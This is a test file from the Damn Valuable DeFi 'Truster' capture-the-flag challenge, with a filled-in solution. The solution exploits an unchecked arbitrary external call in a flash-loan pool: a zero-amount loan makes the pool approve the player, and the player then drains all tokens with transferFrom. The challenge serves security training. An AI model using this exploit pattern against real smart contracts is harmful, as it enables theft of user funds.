const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();
        pool = await (await ethers.getContractFactory("TrusterLenderPool", deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */
        /* We are able to empty the pool due to:
            1) flashLoan function doesn't check if amount is greater than 0 or not.
            2) It is not checking the borrower and target address.
            3) Also, it is executing a unknown data at an unknown external target address.

            target.functionCall(data) will execute target.call{value: value}(data). So if we execute a token approval transaction of the total tokens held by pool to player address, then we can later transfer from pool to player address.
        */
        await pool.flashLoan(
            0,
            player.address,
            token.address,
            token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])
        );
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(0);
    });
});
